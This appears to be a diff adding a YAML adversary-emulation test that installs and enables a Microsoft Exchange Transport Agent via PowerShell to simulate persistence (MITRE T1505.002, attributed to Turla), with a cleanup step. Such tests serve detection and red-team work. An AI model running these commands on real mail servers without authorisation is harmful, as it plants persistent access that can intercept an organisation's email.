@@ -1,0 +1,41 @@
+api_version: "2.0"
+name: Install MS Exchange Transport Agent Persistence
+description: |
+    Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.
+    More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
+args:
+    - name: class_factory
+      type: string
+      default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
+    - name: dll_path
+      type: path
+      default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
+    - name: transport_agent_identity
+      type: string
+      default: Security Interop Agent
+uuid: 43e92449-ff60-46e9-83a3-1a38089df94d
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1505: Server Software Component'
+    subtechniques:
+        - 'T1505.002: Transport Agent'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: install-ms-exchange-transport-agent-persistence
+      inline: |
+        Install-TransportAgent -Name {{.Args.transport_agent_identity}} -TransportAgentFactory {{.Args.class_factory}} -AssemblyPath {{.Args.dll_path}}
+        Enable-TransportAgent {{.Args.transport_agent_identity}}
+        Get-TransportAgent | Format-List Name,Enabled
+      executor: powershell
+      cleanup:
+        inline: |
+            if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
+              Disable-TransportAgent {{.Args.transport_agent_identity}}
+              Uninstall-TransportAgent {{.Args.transport_agent_identity}}
+              Get-TransportAgent
+            }
+        executor: powershell
